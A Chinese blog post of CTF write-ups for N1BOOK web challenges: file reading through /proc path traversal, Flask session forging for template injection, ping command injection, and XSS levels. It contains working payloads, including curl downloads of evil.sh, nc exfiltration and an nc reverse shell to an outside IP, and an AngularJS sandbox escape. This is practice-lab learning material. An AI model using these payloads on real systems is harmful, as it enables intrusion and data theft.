---
title: N1BOOK writeup
date: 2022-04-11 14:34:00
updated: 2022-04-16 18:48:00
tags: [ctf,security]
description: <<从0到1：CTFer成长之路>>配套题目 web相关题目的做题记录 
---

Nu1L Team写的\<\<[从0到1：CTFer成长之路](https://book.nu1l.com/tasks/)\>\>的题目在BUUOJ上都有了复现环境，简单看了看发现WEB的题目wp和环境都比较齐全，决定做一下并且写博客记录一下。

## N1BOOK of web afr_3 writeup

>参考:https://blog.csdn.net/AAAAAAAAAAAA66/article/details/121490787

首页有输入框可以提交name

![](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220411143954822.png)

提交后给出一个article让我们看，先看看里面都是啥

![](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220411143954822.png)

url中可以传参数，随便传一个看看

### 任意文件读取漏洞

![image-20220411144131085](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220411144131085.png)

发现可以任意文件读取，但是尝试读flag是不能直接读的，这里需要对linux的文件目录有一定的了解。

### 利用任意文件读取漏洞结合proc读取源码

/proc 文件系统是一种内核和内核模块用来向进程 (process) 发送信息的机制 (所以叫做 /proc)。这个伪文件系统让你可以和内核内部数据结构进行交互，获取 有关进程的有用信息，在运行中 (on the fly) 改变设置 (通过改变内核参数)。 与其他文件系统不同，/proc 存在于内存之中而不是硬盘上。

/proc 文件系统可以被用于收集有用的关于系统和运行中的内核的信息。

下面是一些重要 的文件：

/proc/cpuinfo - CPU 的信息 (型号, 家族, 缓存大小等) 
/proc/meminfo - 物理内存、交换空间等的信息 
/proc/mounts - 已加载的文件系统的列表 
/proc/devices - 可用设备的列表 
/proc/filesystems - 被支持的文件系统 
/proc/modules - 已加载的模块 
/proc/version - 内核版本 
/proc/cmdline - 系统启动时输入的内核命令行参数

我们需要用到`/proc/N/cmdline` 进程启动命令，`/proc/N/cwd` 链接到进程当前工作目录，利用这两个目录，我们读取`../../../../proc/self/cmdline`，来获取当前进程的启动命令，发现是python server.py，然后我们再利用`../../../../proc/self/cwd/server.py`链接到进程当前工作目录的server.py文件，那么这时候我们就可以直接获取到源码了，获取到的格式比较乱，可以用IDE格式化一下代码方便查看，我用的是vscode格式化代码的插件，但是并不是非常有效，还是需要手动调整一下，下面是调整后的。（后来发现f12就可以看到正常格式的源码，这下猪鼻了，但是编码倒是出了点问题也不知道为啥）

```python
<h1>Article Content:</h1> <br>#!/usr/bin/python
import os
from flask import ( Flask, render_template, request, url_for, redirect, session, render_template_string )
from flask_session import Session

app = Flask(__name__)
execfile(&#39;flag.py&#39;)
execfile(&#39;key.py&#39;)

FLAG = flag
app.secret_key = key
@app.route(&#34;/n1page&#34;, methods=[&#34;GET&#34;, &#34;POST&#34;])
def n1page():
    if request.method != &#34;POST&#34;:
        return redirect(url_for(&#34;index&#34;))
    n1code = request.form.get(&#34;n1code&#34;) or None
    if n1code is not None:
        n1code = n1code.replace(&#34;.&#34;, &#34;&#34;).replace(&#34;_&#34;, &#34;&#34;).replace(&#34;{&#34;,&#34;&#34;).replace(&#34;}&#34;,&#34;&#34;)
    if &#34;n1code&#34; not in session or session[&#39;n1code&#39;] is None:
        session[&#39;n1code&#39;] = n1code
    template = None
    if session[&#39;n1code&#39;] is not None:
        template = &#39;&#39;&#39;&lt;h1&gt;N1 Page&lt;/h1&gt; &lt;div class=&#34;row&gt; &lt;div class=&#34;col-md-6 col-md-offset-3 center&#34;&gt; Hello : %s, why you don&#39;t look at our &lt;a href=&#39;/article?name=article&#39;&gt;article&lt;/a&gt;? &lt;/div&gt; &lt;/div&gt; &#39;&#39;&#39; % session[&#39;n1code&#39;]
        session[&#39;n1code&#39;] = None
    return render_template_string(template)

@app.route(&#34;/&#34;, methods=[&#34;GET&#34;])
def index():
    return render_template(&#34;main.html&#34;)
@app.route(&#39;/article&#39;, methods=[&#39;GET&#39;])
def article():
    error = 0
    if &#39;name&#39; in request.args:
        page = request.args.get(&#39;name&#39;)
    else:
        page = &#39;article&#39;
    if page.find(&#39;flag&#39;)&gt;=0:
        page = &#39;notallowed.txt&#39;
    try:
        template = open(&#39;/home/nu11111111l/articles/{}&#39;.format(page)).read()
    except Exception as e:
        template = e

    return render_template(&#39;article.html&#39;, template=template)

if __name__ == &#34;__main__&#34;:
    app.run(host=&#39;0.0.0.0&#39;, debug=False)
```



### SSTI模板注入漏洞

我们需要注意到的关键是，server.py运行的这个路径下面还有两个文件，key.py和flag.py，我们并不能直接利用任意文件读取的漏洞读取flag文件是因为flag关键词在article()函数中做了过滤，然后这边结合考虑一下之前输入的name有什么用，因为毕竟是一个ctf题目，总共就那么点信息显然是有用处的，看一下这部分的代码

```python

if "n1code" not in session or session['n1code'] is None: 
    session['n1code'] = n1code
template = None
if session['n1code'] is not None:
 template = '''<h1>N1 Page</h1> <div class="row> <div class="col-md-6 col-md-offset-3 center"> Hello : %s, why you don't look at our <a href='/article?name=article'>article</a>? </div> </div> ''' %
session['n1code']
session['n1code'] = None

```

name那个输入框里面填入的值就是n1code的值，代码首先会对post传来n1code过滤一些SSTI关键的符号（下一段会说这样有什么用），然后再看你session里面有没有n1code这个字段，如果没有就会给session加个n1code的字段并且值为POST请求传来的n1code的值被过滤字符后的值，如果有就把session带入模板中执行，那么也就是说根据我们正常传入n1code的值然后他就会过滤SSTI的关键字符后，把n1code的值带进模板里面去执行，这里就会导致SSTI模板注入漏洞。但是SSTI的关键符号被过滤了，大括号都被过滤了，就没有办法让模板执行代码了对吧，所以说直接传n1code进行模板注入的方法并不奏效。

### 伪造session完成SSTI利用

因此我们需要使用伪造session的方式来完成SSTI注入漏洞的利用，因为你会发现你直接传入n1code的值会被过滤，但是你session如果是伪造的，我们就可以让n1code是我们想要执行的恶意代码并且不受到过滤条件的限制了，这非常关键，而且我们恰好有任意文件读取漏洞可以读取key.py这个文件，先来讲讲session是什么。

session是一种对用户身份的认证，并不是你叫ek1ng我就会在session里写ek1ng，session是存储在浏览器中用户可以更改的，那不然别人改个session也叫ek1ng那不是可以被别人轻易冒充，所以说session['n1code']经过key的加密，也就是说在服务端认为n1code是ek1ng，但是在客户端这个n1code的值是‘ek1ng’经过key加密之后的值，因此需要借助工具和通过任意文件读取漏洞来伪造一个session，从而达成对SSTI漏洞的利用。

首先肯定需要看看加密session的key.py文件，

payload:`article?name=../../../proc/self/cwd/key.py`

得到key.py的内容`key = 'Drmhze6EPcv0fN_81Bj-nA'`

借助工具[flask-session-cookie-manager](https://github.com/noraj/flask-session-cookie-manager)来构造session，在命令行执行`.\flask_session_cookie_manager3.py encode -s Drmhze6EPcv0fN_81Bj-nA -t "{'n1code': '{{\'\'.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[\'os\'].popen(\'cat flag.py\').read()}}'}"`

得到伪造后的session![image-20220411223700006](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220411223700006.png)

修改cookie中的session['n1code']的值，就可以看到flag啦

![image-20220411223828860](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220411223828860.png)

然后这题真的自己做的话肯定还是有不少坑的，简单了解一下flask的模板注入就知道，flask模板注入首先要先找可以导入os模块的基类，因为我们需要执行popen来读flag.py文件，但是能导入os模块的基类到底是哪个呢，这和python版本本身就是有关系的，这里可以去看一下我之前写的HGAME final中那道SSTI模板注入的题目中是如何找基类的，那个题是写了个脚本，所以说这题我觉得正儿八经做法就是要写个脚本跑一下看看结果的，但是由于我是没什么思路学习的别人wp，这边就当下懒狗啦，对我来说写个脚本并不困难，主要是学习一下思路，希望别的参考我博客复现的师傅们别偷懒哈哈哈。

## N1BOOK of web 死亡ping命令 writeup

### fuzz

是一个提供了ping命令的在线网站

![image-20220412112049704](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220412112049704.png)

ping是一个在shell中执行的命令，假如我们可以传入恶意用户输入，可以在shell中执行任意命令的话，想要读个flag文件显然不难。

我先是使用了自己的命令行做了一下测试，测试中也遇到不少奇怪的问题，但是发现个可以利用的点

我这里用&把前面的命令挂起，就可以执行后面的命令

![image-20220412114037460](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220412114037460.png)

不过试了试发现题目把&过滤了

![image-20220412114122744](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220412114122744.png)

那看来需要fuzz一下看看过滤了什么，然后再想想能用什么了，我用burpsuite抓包然后来进行fuzz测试

找了好久也没找到什么burpsuite可以用来fuzz单个字符的方法，但是我看别人的wp都能用burpsuite来fuzz单个字符，好奇怪，只能先不管了。

### 换行符绕过waf

总之参考别人的wp，这里绕过过滤执行shell命令的方法是用%0a，也就是url编码的换行符来执行shell命令，由于docker是没有bash、python程序的，官方wp中提到sh反弹是不行的，那这里只能用curl先获取写在我自己服务器上的.sh文件，将想要执行的恶意代码放进.sh文件中，在题目环境中先用curl获取这个.sh文件并放进tmp目录下，再执行.sh文件，命令执行的结果输出到我服务器监听的端口上，下面是payload，在服务器上放一个evil.sh文件，并且在文件中先后写入`ls -la /| nc ip`看到ls的结果后）知道flag文件名字是FLAG，将evil.sh的内容改成`cat /FLAG | nc ip`，再执行一遍即可。

先让evil.sh的内容为`ls -la / | nc ip port`，

payload:`ip=127.0.0.1%0acurl ip:port/evil.sh /tmp/evil.sh` 将放在我服务器上的evil.sh下载到靶机的tmp目录下

payload:`ip=127.0.0.1%0achmod 777 /tmp/evil.sh`用chmod命令给文件执行权限（实际上不用chmod给权限也可以执行）

`nc -nvlp 8089`在我服务器上开启端口监听，这样后面执行evil.sh后可以把结果发到我服务器上

payload:`ip=127.0.0.1%0ash /tmp/evil.sh` 用sh命令执行evil.sh，执行evil.sh中的恶意代码

需要注意一下`ls -la /`这个命令，如果不加/，那么直接ls会在root目录下执行，FLAG放在根目录下，这样你会发现没有flag文件，加了/后发现FLAG文件就在根目录下

![image-20220412225240205](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220412225240205.png)

那接下来就修改一下evil.sh 里面内容为`cat /FLAG | nc ip port`就可以

payload:`ip=127.0.0.1%0acurl ip:port/evil.sh /tmp/evil.sh` 将放在我服务器上的evil.sh下载到靶机的tmp目录下

payload:`ip=127.0.0.1%0achmod777 /tmp/evil.sh`用chmod命令给文件执行权限（实际上不用chmod给权限也可以执行）

`nc -nvlp 8089`在我服务器上开启端口监听，这样后面执行evil.sh后可以把结果发到我服务器上

payload:`ip=127.0.0.1%0ash /tmp/evil.sh` 用sh命令执行evil.sh，执行evil.sh中的恶意代码

![image-20220412224057283](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220412224057283.png)

拿到flag啦，但是拿到flag后我又很奇怪其中的一些步骤为什么反弹shell不行，因为这里是有nc的，所以我就尝试用nc反弹shell了

在evil.sh中写入`nc ip port -e /bin/sh`，然后还是和上面一样用`ip=127.0.0.1%0acurl ip:port/evil.sh /tmp/evil.sh`把文件读到/tmp目录下并且用`ip=127.0.0.1%0ash /tmp/evil.sh`执行evil.sh，发现可以成功弹shell...可能是BUU的环境不太对劲？这就不清楚了。

![image-20220413114849678](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220413114849678.png)

那既然把命令写在文件里面执行可以的话，感觉也可以直接弹shell吧，用payload:`ip=127.0.0.1%0anc 39.108.253.105 8089 -e /bin/sh`试了试发现有被过滤的字符，这么一想确实把命令写在文件里面用curl下载再执行的方式可以绕过一些过滤，题目的环境和官方wp有些不太对的上，也不懂为啥官方wp说不能弹shell，有点迷惑，就这样吧这个题。

## N1BOOK of web XSS闯关 writeup

### Level 1

```
/level1?username=<script>alert()<script>
```

最简单的反射型xss 在url传参中做利用。

官方wp中给出的`/level1?username=xss%3Csvg/onload=alert()`看不懂而且我也没法用这个payload打通...挺迷的，大概意思应该是插入一个svg，然后在svg里面写个onload事件触发alert吧。

### Level 2

还是先尝试一下最简单的xss，发现不行，然后查看一下源码

```javascript
    	if(location.search == ""){
    		location.search = "?username=xss"
    	}
    	var username = 'xss';
    	document.getElementById('ccc').innerHTML= "Welcome " + escape(username);
    
```

传入的username参数被escape函数编码了，escape() 函数可对字符串进行编码，这样就可以在所有的计算机上读取该字符串。 该方法不会对ASCII 字母和数字进行编码，也不会对下面这些ASCII 标点符号进行编码： * @ - _ + . / 。 其他所有的字符都会被转义序列替换。

escape把字符串编码后，那就不会把传入内容直接当js执行了，所以说之前的办法行不通，但是不代表不能XSS，这里漏洞产生的原因是username这个js中的变量受用户直接控制且只有escape这个编码过滤，我们传入`?username=';</script><script>alert()</script>//`，这样js会执行

```javascript
<script type="text/javascript">
var username = '';</script><script>alert()</script>//';
</script>
```

先用一个引号闭合username，然后再用一个`</script>`和前面的`<script>`闭合，后面插入script标签就可以执行任意js函数了。

官方解法是`?username='-alert()`，其实差不多的解法，但是不太懂`-`是什么意思，不过把`-`换成`;`后也可以打通。

### Level 3

```js
    	if(location.search == ""){
    		location.search = "?username=xss"
    	}
    	var username = 'xss';
    	document.getElementById('ccc').innerHTML= "Welcome " + username;
    
```

这里把escape取消了其他啥也没变？？

我用我自己Level 2中的payload也可以成功打通，但是level 2官方的payload在level 3中不适用，这个没搞懂为啥。

因为把escape取消了所以下面innerHTML中的拼接也有了可以利用的地方，这里可以插入一些html中的标签来达成xss的效果。

官方wp中插入了img标签，学习一下他的做法，`?username=xss<img src=x onerror=alert()>`其实是一种利用img标签的onerror属性进行xss的常见做法。

onerror是一个js事件，当图片不存在时会触发，所以只要src属性找不到对应图片，写在onerror中的js语句就可以得以执行。

### Level 4

```js
    	var time = 10;
    	var jumpUrl;
    	if(getQueryVariable('jumpUrl') == false){
    		jumpUrl = location.href;
    	}else{
    		jumpUrl = getQueryVariable('jumpUrl');
    	}
    	setTimeout(jump,1000,time);
    	function jump(time){
    		if(time == 0){
    			location.href = jumpUrl;
    		}else{
    			time = time - 1 ;
    			document.getElementById('ccc').innerHTML= `页面${time}秒后将会重定向到${escape(jumpUrl)}`;
    			setTimeout(jump,1000,time);
    		}
    	}
		function getQueryVariable(variable)
		{
		       var query = window.location.search.substring(1);
		       var vars = query.split("&");
		       for (var i=0;i<vars.length;i++) {
		               var pair = vars[i].split("=");
		               if(pair[0] == variable){return pair[1];}
		       }
		       return(false);
		}
    
```

这里也比较明显，接收jumpUrl参数，并且将参数拼接进innerHTML，导致xss注入

但是这里jumpUrl有escape字符串编码再拼接进去，所以这里的利用需要使用javascript伪协议来执行，由于这里有url跳转，传入参数会被拼在url里面，在浏览器打开javascript：URL的时候，它会先运行URL中的代码，当返回值不为undefined的时候，前页链接会替换为这段代码的返回值，payload：`?jumpUrl=javascript:alert()`

### Level 5

```js
    	if(getQueryVariable('autosubmit') !== false){
    		var autoForm = document.getElementById('autoForm');
    		autoForm.action = (getQueryVariable('action') == false) ? location.href : getQueryVariable('action');
    		autoForm.submit();
    	}else{
    		
    	}
		function getQueryVariable(variable)
		{
		       var query = window.location.search.substring(1);
		       var vars = query.split("&");
		       for (var i=0;i<vars.length;i++) {
		               var pair = vars[i].split("=");
		               if(pair[0] == variable){return pair[1];}
		       }
		       return(false);
		}
    
```

发现代码首先接收get请求参数autosubmit，如果不是false就继续执行，然后接收get请求参数action，如果接收到action参数就读action参数并且提交表单，利用javascript伪协议可以在提交的表单中执行任意js代码。

payload：`?action=javascript:alert()&autosubmit=1`

### Level 6

>参考：
>
>https://juejin.cn/post/6891628594725847047
>
>http://www.mdlabs.cn/index.php/2022/04/01/buuctf-n1book-xss%E9%97%AF%E5%85%B31-%E3%80%90xss%E5%B0%8F%E7%BB%93%E3%80%91/

这个题目比较复杂，首先是源代码里面直接看js是看不出来什么的，这里要利用Angular.js的模板注入来逃逸沙箱，达成XSS漏洞的利用。

先判断存在angular模板注入

![image-20220413155408133](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220413155408133.png)

![image-20220413155324232](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220413155324232.png)

只从做题的角度来看的话，找一下angular 1.4.6的payload，直接就打通了

从https://juejin.cn/post/6891628594725847047#heading-8中，payload

```
?username={{x={y:''.constructor.prototype}; x.y.charAt=[].join; [1]|orderBy:'x=alert(1)}}'
```

直接打通，flag到手啦

然后我们来研究一下AngularJS的模板注入，主要看这篇文章https://juejin.cn/post/6891628594725847047#heading-8

真看不懂....麻了，找个时间认真研究一下吧





